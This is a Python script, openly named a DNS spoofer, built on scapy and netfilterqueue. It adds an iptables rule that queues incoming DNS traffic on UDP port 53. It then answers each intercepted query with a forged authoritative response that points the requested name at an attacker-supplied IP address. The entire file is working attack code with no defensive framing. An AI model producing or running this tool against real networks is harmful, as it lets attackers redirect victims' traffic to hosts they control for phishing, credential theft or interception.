from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, UDP
from subprocess import call
import utils, argparse

# Global variables
attackerIp=''

parser = argparse.ArgumentParser(description='DNS Spoofer')
parser.add_argument('-aip', '--attacker_ip', dest='attackerIp', help='Attacker IP Address', required=True)
args = parser.parse_args()

def filterCallback(packet):
    """
    Callback for NetFilter Queue Event
    Checks if packet contains a DNS Query, if so modifies the packet and spoofs the destination IP
    address
    :param packet: object
    """
    query = IP(packet.get_payload())

    if query.haslayer(DNSQR):
            # Create new DNS response packet
            response = IP()/UDP()/DNS()
            # Create IP Header
            response[IP].dst = query[IP].src
            response[IP].src=query[IP].dst
            # Create UDP Header
            response[UDP].sport = query[UDP].dport
            response[UDP].dport = query[UDP].sport
            # Modify DNS Header
            # Set ID to request packet id
            response[DNS].id = query[DNS].id
            # Set QR to 1 (Response)
            response[DNS].qr = 1
            # Set AA to 1 (Is Authoritative)
            response[DNS].aa = 1
            # Copy DNS Question Definition
            response[DNS].qd = query[DNS].qd
            # Create Spoofed DNS Answer
            response[DNS].an = DNSRR(
                # Copy Original Query Name
                rrname=query[DNS].qd.qname,
                # Attach Spoofed IP Address to associate with the name
                rdata=attackerIp
            )
            packet.set_payload(str(response))


    packet.accept()


def createIpTablesDnsNfQueue():
    """
    Creates Net Filter Queue to redirect DNS Query traffic
    """
    command = [
        'iptables',
        '-t', 'nat',
        '-A', 'PREROUTING',
        '-p', 'udp',
        '--dport', '53',
        '-j', 'NFQUEUE',
        '--queue-num', '1'
    ]

    call(command)

if __name__ == "__main__":
    netfilterQueue = NetfilterQueue()
    try:
        # Set variables from arguments
        attackerIp = args.attackerIp

        # Create and run netfilter queue
        createIpTablesDnsNfQueue()
        netfilterQueue.bind(1, filterCallback)
        netfilterQueue.run()

    except KeyboardInterrupt:
        netfilterQueue.unbind()
        print('Bye...')
